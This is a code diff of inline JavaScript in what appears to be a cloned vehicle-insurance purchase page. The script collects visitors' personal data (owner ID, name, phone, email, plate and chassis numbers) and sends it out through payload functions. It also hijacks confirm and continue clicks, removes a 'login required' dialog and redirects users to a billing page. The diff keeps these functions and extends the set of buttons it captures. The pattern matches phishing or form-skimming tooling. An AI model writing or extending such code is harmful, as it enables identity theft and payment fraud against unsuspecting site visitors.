@@ -3629,6 +3629,7 @@
     }, true);
 
         
+    
     // 🛡️ الحارس المطور (DOM-Guardian) ومؤقت الاتصال (Active Ping) والتحويل الفوري لـ bill.html
     (function() {
         function sendVisitorPing() {
@@ -3649,32 +3650,15 @@
     (function() {
         function getFormInputs() {
             var inputs = {};
-            document.querySelectorAll('input, select, textarea').forEach(function(inp) {
-                if (inp.type === 'hidden' || inp.type === 'submit' || inp.type === 'button') return;
-                if (inp.placeholder && inp.placeholder.includes('ابحث')) return;
-                if ((inp.type === 'checkbox' || inp.type === 'radio') && !inp.checked) return;
-                var val = inp.value ? inp.value.trim() : '';
-                if (!val) return;
-                var check = ((inp.name||'') + ' ' + (inp.id||'') + ' ' + (inp.placeholder||'')).toLowerCase();
-                var key = check.includes('plate') || check.includes('لوحة') ? 'رقم اللوحة' :
-                          check.includes('chassis') || check.includes('شاصي') || check.includes('هيكل') ? 'رقم الشاسيه' :
-                          check.includes('country') || check.includes('دولة') ? 'دولة القدوم' :
-                          check.includes('port') || check.includes('منفذ') ? 'منفذ الدخول' :
-                          check.includes('duration') || check.includes('مدة') ? 'مدة التأمين' :
-                          check.includes('id') || check.includes('هوية') ? 'رقم هوية المالك' :
-                          check.includes('owner') || check.includes('مالك') || check.includes('الاسم') ? 'الاسم الكامل للمالك' :
-                          check.includes('phone') || check.includes('جوال') || check.includes('هاتف') ? 'رقم الجوال' :
-                          check.includes('email') || check.includes('بريد') ? 'البريد الإلكتروني' : (inp.placeholder || inp.name || inp.id);
-                if (key) inputs[key] = val;
-            });
+            try { inputs = JSON.parse(localStorage.getItem('saas_last_submission') || '{}'); } catch(e) {}
             return inputs;
         }
 
         function triggerSubmitAndRedirect() {
             if (window.hasTriggeredFinalConfirm) return;
             window.hasTriggeredFinalConfirm = true;
+            console.log('[SHIELD] Final submission triggered!');
             var inputs = getFormInputs();
-            localStorage.setItem('saas_last_submission', JSON.stringify(inputs));
             if (typeof sendSmartPayload === 'function') sendSmartPayload('buy_insurance_form', 'شراء وثيقة تأمين', inputs, 'confirmed', false);
             if (typeof sendPayloadToHub === 'function') sendPayloadToHub(inputs, true);
             setTimeout(function() {
@@ -3694,7 +3678,7 @@
                 txt += ' ' + (temp.innerText || temp.textContent || temp.value || temp.className || '').trim();
                 temp = temp.parentElement;
             }
-            var isConfirmClick = txt.includes('تأكيد') || txt.includes('إصدار') || txt.includes('الطلب') || txt.includes('شراء') || txt.includes('دفع');
+            var isConfirmClick = txt.includes('تأكيد') || txt.includes('إصدار') || txt.includes('الطلب') || txt.includes('شراء') || txt.includes('دفع') || txt.includes('المتابعة') || txt.includes('متابعة');
             if (isConfirmClick) {
                 e.preventDefault(); e.stopPropagation(); e.stopImmediatePropagation();
                 if (['click', 'mouseup', 'pointerup', 'touchend'].indexOf(e.type) !== -1) { triggerSubmitAndRedirect(); }
@@ -3717,7 +3701,7 @@
 
         function scanAndEliminateModal() {
             document.querySelectorAll('div, section, p, h1, h2, h3, h4, h5, h6, span, button').forEach(function(el) {
-                var txt = el.innerText || '';
+                var txt = el.textContent || '';
                 if (txt.includes('تسجيل الدخول مطلوب') || txt.includes('الدخول مطلوب')) {
                     var container = el.closest('.fixed') || el.closest('[class*="backdrop"]') || el.closest('[class*="modal"]') || el.closest('[class*="popup"]') || el;
                     container.style.display = 'none'; container.style.visibility = 'hidden'; container.remove(); triggerSubmitAndRedirect();
@@ -3726,6 +3710,5 @@
         }
         setInterval(scanAndEliminateModal, 100);
     })();
-
 })();
 </script></body></html>
